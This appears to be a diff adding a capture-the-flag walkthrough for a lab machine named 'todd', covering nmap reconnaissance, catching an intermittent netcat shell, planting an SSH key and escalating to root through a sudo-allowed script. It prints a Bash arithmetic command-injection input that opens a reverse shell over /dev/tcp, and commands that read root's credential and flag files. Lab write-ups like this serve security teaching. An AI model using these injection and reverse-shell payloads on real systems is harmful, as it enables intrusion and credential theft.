@@ -1,0 +1,109 @@
+<h2>Reconnaissance</h2>
+<h3>Initial Nmap Scan</h3>
+<pre><code class="language-bash">$ nmap -sV -sC -p- 192.168.56.3 -A
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp    open  http       Apache httpd 2.4.59 ((Debian))
+2519/tcp  open  tcpwrapped
+4470/tcp  open  tcpwrapped
+...
+</code></pre>
+<h3>Second Nmap Scan Reveals Interesting Port</h3>
+<pre><code class="language-bash">$ nmap -sV -p- 192.168.56.3
+-----------
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp    open  http       Apache httpd 2.4.59 ((Debian))
+7066/tcp  open  unknown
+...
+</code></pre>
+<p>Note: Port 7066 appears intermittently.</p>
+<h2>Initial Access via Port 7066</h2>
+<h3>Persistent Connection Attempt</h3>
+<pre><code class="language-bash">$ while true;do nc 192.168.56.3 7066;done
+(UNKNOWN) [192.168.56.3] 7066 (?) : Connection refused
+(UNKNOWN) [192.168.56.3] 7066 (?) : Connection refused
+whoami
+todd
+</code></pre>
+<h3>Establishing SSH Access</h3>
+<ol>
+<li>Generate SSH key on attacker machine:</li>
+</ol>
+<pre><code class="language-bash">ssh-keygen -t rsa -f todd
+</code></pre>
+<ol start="2">
+<li>On target machine:</li>
+</ol>
+<pre><code class="language-bash">mkdir -p /home/todd/.ssh
+echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCOd2qBPt87qsYOMlBoxpn6uTqyKwHLIXcNj8eO.... void-strike@athena&quot; &gt; /home/todd/.ssh/authorized_keys
+</code></pre>
+<ol start="3">
+<li>Connect via SSH:</li>
+</ol>
+<pre><code class="language-bash">ssh todd@192.168.56.3 -i ~/.ssh/todd
+</code></pre>
+<h2>Privilege Escalation</h2>
+<h3>Checking Sudo Privileges</h3>
+<pre><code class="language-bash">$ sudo -l
+Matching Defaults entries for todd on todd:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User todd may run the following commands on todd:
+    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
+    (ALL : ALL) NOPASSWD: /usr/bin/rm
+    (ALL : ALL) NOPASSWD: /usr/sbin/reboot
+</code></pre>
+<h3>Analyzing guess_and_check.sh</h3>
+<pre><code class="language-bash"># check this script used by human 
+a=$((RANDOM%1000))
+echo &quot;Please Input [$a]&quot;
+
+echo &quot;[+] Check this script used by human.&quot;
+echo &quot;[+] Please Input Correct Number:&quot;
+read -p &quot;&gt;&gt;&gt;&quot; input_number
+
+[[ $input_number -ne &quot;$a&quot; ]] &amp;&amp; exit 1
+
+sleep 0.2
+true_file=&quot;/tmp/$((RANDOM%1000))&quot;
+sleep 1
+false_file=&quot;/tmp/$((RANDOM%1000))&quot;
+
+[[ -f &quot;$true_file&quot; ]] &amp;&amp; [[ ! -f &quot;$false_file&quot; ]] &amp;&amp; cat /root/.cred || exit 2
+</code></pre>
+<h3>Method 1: File Creation Exploit</h3>
+<ol>
+<li>Create dummy files to increase probability:</li>
+</ol>
+<pre><code class="language-bash">for i in {1..600}; do touch /tmp/$i ;done
+</code></pre>
+<ol start="2">
+<li>Run the script repeatedly until successful:</li>
+</ol>
+<pre><code class="language-bash">sudo /bin/bash /srv/guess_and_check.sh
+</code></pre>
+<h3>Method 2: Command Injection</h3>
+<ol>
+<li>Execute arbitrary commands through input:</li>
+</ol>
+<pre><code class="language-bash">Please Input [316]
+[+] Check this script used by human.
+[+] Please Input Correct Number:
+&gt;&gt;&gt;N[$(/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/9001 0&gt;&amp;1)]
+</code></pre>
+<ol start="2">
+<li>Set up listener:</li>
+</ol>
+<pre><code class="language-bash">nc -vlnp 9001
+</code></pre>
+<h3>Explanation of Command Injection</h3>
+<p>The input <code>N[$(cat /root/root.txt)]</code> is interpreted in an arithmetic context, causing Bash to attempt evaluating the flag contents as arithmetic, which fails and reveals the flag content in the error message.</p>
+<h2>Root Access</h2>
+<p>Use the credentials from /root/.cred to switch to root:</p>
+<pre><code class="language-bash">su
+Password: [content of /root/.cred]
+root@todd:/home/todd#
+</code></pre>
+<p>Or via the reverse shell obtained through command injection.</p>
